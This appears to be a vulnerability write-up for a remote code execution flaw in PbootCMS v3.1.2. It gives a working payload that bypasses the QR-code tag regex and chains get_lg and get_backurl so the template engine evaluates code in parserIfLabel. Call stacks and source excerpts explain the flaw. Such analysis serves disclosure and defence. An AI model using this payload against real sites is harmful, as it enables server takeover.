## PbootCMS v3.1.2 RCE

```
?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;id
```

![image-20220525003611932](https://camo.githubusercontent.com/038c9561fcfc03789a94a453eced386c365d083ef9bde95687400892a9bd12d0/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532353030333631313933322e706e67)

debug：

Finally we execute the malicious code in the `parserIfLabel` using eval

```
eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
```

Call Stack

```
ParserController.php:3310, app\home\controller\ParserController->parserIfLabel()
ParserController.php:84, app\home\controller\ParserController->parserAfter()
SearchController.php:42, app\home\controller\SearchController->index()
IndexController.php:53, app\home\controller\IndexController->_empty()
2:2, core\basic\Kernel::zilvriijuizzauc606dfdd68060e63ad8f7c7ddd49b8b8()
2:2, core\basic\Kernel::run()
start.php:17, require()
index.php:23, {main}()
```

First bring in the payload, after rendering the template the system will load the malicious statement

![image-20220524234447190](https://camo.githubusercontent.com/75a2f9b337d8f63a8a8338d84f24467389b3b16a68faebef35adc1ad9b8a3e4b/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532343233343434373139302e706e67)

So let's follow up with the initial rendering template section

![image-20220524235013077](https://camo.githubusercontent.com/f73d17528d6826d198bda301b57ebce7421635a3abad64a1f07f649eb59dfbc2/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532343233353031333037372e706e67)

Continue to see `$content = ob_get_contents();` Here the url is output directly and then saved to `$content`.

![image-20220524235106334](https://camo.githubusercontent.com/9816b4a3a8a3afe986e8168e57e29110cd6c6adafdf61a94426f2ff14d6908b5/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532343233353130363333342e706e67)

Then there is no point in filtering for keywords after that

The problem actually lies in the QR code generation function `parserQrcodeLabel`

![image-20220525000915537](https://camo.githubusercontent.com/c6a7af4e0ebdca3375f64e3366d2433b3e9b32d24f29568d12da6dcb511a6f6c/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532353030303931353533372e706e67)

Here the content of the tag QR code is matched, and then it will generate the QR code link

![image-20220525001354043](https://camo.githubusercontent.com/e7eaf98758977fe2742e755fa7698c229a89d2275433cd3cb3db0e9f26337130/68747470733a2f2f636f736d6f736c696e2e6f73732d636e2d6368656e6764752e616c6979756e63732e636f6d2f696d67322f696d6167652d32303232303532353030313335343034332e706e67)

If we want to exploit this, we need to make sure that our malicious code is not matched in this step, and here we need to do a bypass of the regular

```
/\{pboot:qrcode(\s+[^}]+)?\}/
```

It is easy to see that we just need to make a closure using `}`

Next `$content` goes through a series of functions to the `parserIfLabel` function

We use `get_lg` and `get_backurl` functions with regular bypass to complete the RCE

Both functions are in `function.php`

`get_lg` is the field from which the `cookie lg` is taken

```
// 获取当前语言并进行安全处理Å
function get_lg()
{
    $lg = cookie('lg');
    if (! $lg || ! preg_match('/^[\w\-]+$/', $lg)) {
        $lg = get_default_lg();
        cookie('lg', $lg);
    }
    return $lg;
}
```

`get_backurl` is from `get`

```
// 获取返回URL
function get_backurl()
{
    if (! ! $backurl = get('backurl')) {
        if (isset($_SERVER["QUERY_STRING"]) && ! ! get('p')) {
            return "&backurl=" . $backurl;
        } else {
            return "?backurl=" . $backurl;
        }
    } else {
        return;
    }
}
```

Since the vulnerability point does not exist in `search`, it can be called from any interface

